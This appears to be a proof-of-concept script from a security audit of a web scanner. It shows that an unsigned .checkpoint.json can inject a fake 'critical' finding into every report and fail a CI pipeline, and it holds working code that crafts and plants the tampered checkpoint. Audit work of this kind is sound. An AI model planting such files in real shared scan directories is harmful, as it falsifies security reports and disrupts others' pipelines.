"""PoC-07: Checkpoint tampering — fake critical finding injected via .checkpoint.json.

Root cause (checkpoint.py:76-122):
    def restore_result(self, result) -> None:
        data = self.state.get("data", {})
        ...
        result.findings.extend(_list(Finding, data["vuln"].get("findings", [])))

CheckpointManager loads .checkpoint.json with no integrity check (no HMAC, no
signature, no schema validation beyond _safe_init).  Any attacker (or malicious
process) who can write to the scan output directory can plant a checkpoint with
arbitrary findings, which will then appear in every generated report.

Attack scenario: the scan is running as a CI job that writes to a shared
directory (e.g., a mounted volume).  A concurrent process writes a crafted
.checkpoint.json with severity=critical findings.  When the scan resumes (or is
interrupted and re-run with --resume), the fake critical finding appears in all
report formats and may trigger --fail-on critical → CI pipeline fails.

No external network traffic; everything runs in-process.
"""
import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from _common import report as _report          # noqa: E402
from scanner.checkpoint import CheckpointManager  # noqa: E402
from scanner.models import ScanResult             # noqa: E402

FAKE_TITLE = "INJECTED-CRITICAL-RCE-XYZ"


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="poc07_"))

    # ── craft the malicious checkpoint ───────────────────────────────────────
    fake_finding = {
        "title":    FAKE_TITLE,
        "severity": "critical",
        "source":   "rce",
        "host":     "example.com",
        "url":      "https://example.com/rce",
        "detail":   "Injected by attacker",
        "tags":     ["rce"],
        "evidence": "",
    }
    crafted = {
        "target":       "example.com",
        "phases_done":  ["recon", "passive", "crawl", "js", "params", "methods", "vuln"],
        "data": {
            "vuln": {
                "findings": [fake_finding],
            }
        },
    }

    checkpoint_file = tmp / ".checkpoint.json"
    checkpoint_file.write_text(json.dumps(crafted))

    # ── restore ───────────────────────────────────────────────────────────────
    mgr    = CheckpointManager(str(tmp))
    result = ScanResult(target="example.com", scan_date="2026-01-01", base_dir=str(tmp))
    mgr.restore_result(result)

    fake_in_findings = any(f.title == FAKE_TITLE for f in result.findings)
    fake_severity    = next(
        (f.severity for f in result.findings if f.title == FAKE_TITLE), None
    )

    confirmed = fake_in_findings and fake_severity == "critical"
    detail = (
        f"fake_finding_in_result={fake_in_findings} | "
        f"severity={fake_severity!r} | "
        f"total_findings={len(result.findings)}"
    )
    return _report(
        "PoC-07",
        "Checkpoint tampering injects fake critical finding into every report format",
        confirmed, detail,
    )


if __name__ == "__main__":
    raise SystemExit(main())
